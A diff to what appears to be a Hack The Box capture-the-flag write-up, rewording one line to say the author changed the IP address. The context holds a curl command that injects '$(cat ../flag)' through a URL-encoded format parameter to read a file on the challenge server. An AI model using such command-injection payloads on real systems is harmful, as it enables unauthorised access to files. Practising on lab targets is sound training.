@@ -51,7 +51,7 @@ class TimeModel
 }
 ``````
 
-Now knowing that HTB re-used the same challenge on a differently formatted website (that in itself is a vulnerability) I followed Tri Wanda Septian instructions, where he used the following command:
+Now knowing that HTB re-used the same challenge on a differently formatted website (that in itself is a vulnerability) I followed Tri Wanda Septian instructions, where he used the following command (I changed the IP address to match my own):
 ``````bash
 curl 'http://134.209.28.236:31321/?format=%H-%M-%S-%27;$(cat%20../flag)%27' | html2text | grep HTB{
 ``````
